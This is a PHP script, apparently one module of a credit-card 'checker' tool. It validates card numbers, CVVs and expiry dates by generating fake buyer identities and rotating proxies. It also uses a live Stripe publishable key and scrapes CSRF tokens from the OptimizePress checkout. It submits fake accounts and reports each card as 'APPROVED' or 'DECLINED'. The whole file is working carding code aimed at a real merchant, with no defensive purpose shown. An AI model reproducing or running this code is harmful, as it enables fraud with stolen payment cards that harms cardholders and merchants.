<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'type=card&billing_details[name]='.$fake->first.'+'.$fake->last.'&billing_details[email]='.urlencode($fake->email).'&billing_details[address][country]=US&billing_details[address][state]=New+York&billing_details[address][city]=Brewster&billing_details[address][postal_code]=10509&billing_details[address][line1]=12+Main+Street&billing_details[address][line2]=&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F1104f1bb4%3B+stripe-js-v3%2F1104f1bb4&time_on_page='.rand(50000, 100000).'&key=pk_live_GBmDqzH1dfwKlf9cwpIRJWqX';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/payment_methods', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

$pm = $json_r1->id;

$r2 = $this->curlx->Get('https://my.optimizepress.com/cart/checkout/suite-1-site', null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$xsrf = $this->getstr(json_encode($r2->headers->response), 'XSRF-TOKEN=', ';');

$csrf = trim(strip_tags($this->getstr($r2->body, 'csrf-token" content="', '"')));

if (empty($xsrf) || empty($csrf)) {
	$empty = 'Second Request Tokens are Empty';

	goto start;
}

$data = '{"email":"'.$fake->email.'","first_name":"'.$fake->first.'","last_name":"'.$fake->last.'","company":null,"address":"12 Main Street","address_2":"","vat_number":null,"zip_code":"10509","country":"US","city":"Brewster","state":"New York","payment_method":"'.$pm.'"}';

$headers = [
	'authority: my.optimizepress.com',
	'accept: application/json, text/plain, */*',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'content-type: application/json;charset=UTF-8',
	'origin: https://my.optimizepress.com',
	'referer: https://my.optimizepress.com/cart/checkout/suite-1-site',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'x-csrf-token: '.$csrf.'',
	'x-requested-with: XMLHttpRequest',
	'x-xsrf-token: '.$xsrf.'',
];

$r3 = $this->curlx->Post('https://my.optimizepress.com/api/cart/account', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$json_r3 = json_decode($r3->body);

if (strpos($r3->body, '"active":') !== false) {
	$result = $json_r3->active ? 'Active -> True' : '3D Secure Card';

	$status = ['emoji' => '✅', 'status' => 'APPROVED', 'msg' => "CVV CARD - $result!"];

	goto end;
}

$msg = $json_r3->message ?? '';

if (empty($msg)) file_put_contents('stl_r3_err.txt', $r3->body . PHP_EOL, FILE_APPEND);

$status = $this->response->Stripe($r3->body, $msg);

end: